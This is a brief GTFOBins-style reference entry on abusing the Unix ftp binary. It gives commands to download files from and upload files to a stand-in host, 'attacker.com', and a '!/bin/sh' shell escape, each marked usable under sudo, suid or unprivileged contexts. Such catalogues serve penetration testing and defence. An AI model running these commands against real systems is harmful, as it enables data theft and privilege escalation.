---
type: gtfobin
name: ftp
platform: Unix
functions: [download, shell, upload]
tags: [gtfobin, unix, lotl]
---

# ftp

## download

```bash
ftp -a attacker.com
get /path/to/input-file output-file
```
_Instead of `-a`, credentials can be supplied via the `user:password@host` connection string._
**Contexts:** sudo, suid, unprivileged

## shell

```bash
ftp
!/bin/sh
```
**Contexts:** sudo, suid, unprivileged

## upload

```bash
ftp -a attacker.com
put /path/to/input-file output-file
```
_Instead of `-a`, credentials can be supplied via the `user:password@host` connection string._
**Contexts:** sudo, suid, unprivileged
